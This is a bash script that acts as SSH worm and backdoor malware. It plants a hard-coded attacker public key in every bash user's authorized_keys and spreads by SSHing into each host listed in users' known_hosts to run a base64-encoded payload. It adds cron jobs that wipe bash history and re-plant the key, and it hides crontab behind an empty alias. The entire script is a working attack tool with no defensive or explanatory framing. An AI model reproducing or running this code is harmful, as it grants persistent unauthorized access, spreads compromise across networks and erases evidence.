set +e
if [ "$xKeys" = "" ];
then
  xKeys="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001"
fi

# bCode=`cat clearHis.sh end.sh|base64|tr -d "\n"`

# echo  ~/
# 
# python -m SimpleHTTPServer 7099
doOneUser()
{
  uPath="$1"
  
  if [ -f $uPath/.ssh/known_hosts ] && [ -f $uPath/.ssh/id_rsa.pub ]; then
    for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $uPath/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "bash -c {echo,$bCode}|{base64,-d}|{bash,-i}" & done
  fi
}
doOneUser "/root"
for file in /home/*
do
  if test -d $file
  then
    doOneUser $file
  fi
done


if [ `whoami` = "root" ];
then
  szTmp1='mkdir {}/.ssh 2>/dev/null;echo "'${xKeys}'">{}/.ssh/authorized_keys;chmod 600 {}/.ssh/authorized_keys'
  cat /etc/passwd|grep '/bash'|cut -d: -f6|xargs -I {} bash -c "${szTmp1}"
  echo "00 20 * * * cat /dev/null > ~/.bash_history" >/tmp/myX.sh
  echo '00 20 * * * mkdir ~/.ssh 2>/dev/null;echo "'${xKeys}'">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys' >>/tmp/myX.sh
  crontab -l >>/tmp/myX.sh
  `cat /tmp/myX.sh|sort -u | crontab -`
  `cat /tmp/myX.sh|sort -u | /usr/bin/crontab -`
  echo 'alias crontab=""'>>~/.bashrc
  alias crontab=""
fi
echo 'mkdir ~/.ssh 2>/dev/null;echo "'${xKeys}'">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys' >>~/.bashrc
rm -rf /tmp/myX.sh
